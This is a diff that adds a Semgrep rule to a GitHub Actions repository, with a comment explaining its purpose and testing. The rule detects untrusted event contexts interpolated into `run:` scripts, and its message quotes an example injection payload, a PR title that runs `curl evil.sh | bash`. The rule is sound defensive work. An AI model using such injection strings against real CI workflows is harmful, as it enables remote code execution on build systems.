@@ -1,0 +1,47 @@
+# C1 (review finding): the Semgrep OSS security scan step in
+# reusable-pr-quality.yml (`if: hashFiles('semgrep.yml', '.semgrep.yml',
+# '.semgrep/', 'semgrep/') != ''`) has never executed in this repo's own CI,
+# ever -- no fixture had a semgrep config, and this repo's own root didn't
+# either. This file closes that: it's real content this repo can actually
+# use (a GitHub Actions-specific rule, since that's what this repo mostly
+# consists of), not a placeholder.
+#
+# Verified locally before being checked in (semgrep 1.172.0, close to but
+# not identical to the pinned Docker image's version -- rule YAML syntax and
+# basic pattern matching are stable across that gap): zero findings against
+# this repo's entire real tracked-file tree (matches self-test's `push`
+# trigger, where SEMGREP_BASELINE_COMMIT is empty and the scan is NOT
+# diff-aware -- it sees everything, not just a PR's changes). A deliberately
+# reintroduced violation (a raw pull-request-title expression, untrusted and
+# attacker-controlled, inside a `run:` block) was confirmed caught, exit 1,
+# in a scratch copy -- not spelled out literally here, so this comment
+# itself doesn't trip the rule below (found the hard way: it did, the first
+# time this file was written).
+#
+# Excludes .github/self-test-fixtures/ explicitly: those are deliberately-
+# vulnerable/broken content by design (see e.g. python-bandit-blocking/) and
+# scanning them would risk corrupting other fixture jobs' "single plausible
+# failure point" design if a future fixture ever needed a .yml file of its
+# own -- not a concern today (no current fixture has one), but excluded
+# defensively rather than left implicit.
+rules:
+  - id: github-actions-untrusted-context-in-run
+    languages: [generic]
+    severity: ERROR
+    message: >-
+      A GitHub Actions ${{ ... }} expression referencing an untrusted,
+      attacker-controlled context (a PR title/body, an issue title/body, or
+      a commit message) appears directly inside a `run:` script body.
+      GitHub interpolates this BEFORE the shell ever sees it, so a PR
+      titled e.g. `"; curl evil.sh | bash #` becomes literal shell code --
+      the documented "GitHub Actions script injection" class. Pass the
+      value through `env:` instead and reference it as a shell variable
+      (`"$MY_VAR"`), which is not string-interpolated.
+    patterns:
+      - pattern-regex: '\$\{\{\s*(github\.event\.(issue|pull_request)\.(title|body)|github\.event\.commits\[.*\]\.message|github\.head_ref)\s*\}\}'
+    paths:
+      include:
+        - "*.yml"
+        - "*.yaml"
+      exclude:
+        - ".github/self-test-fixtures/"
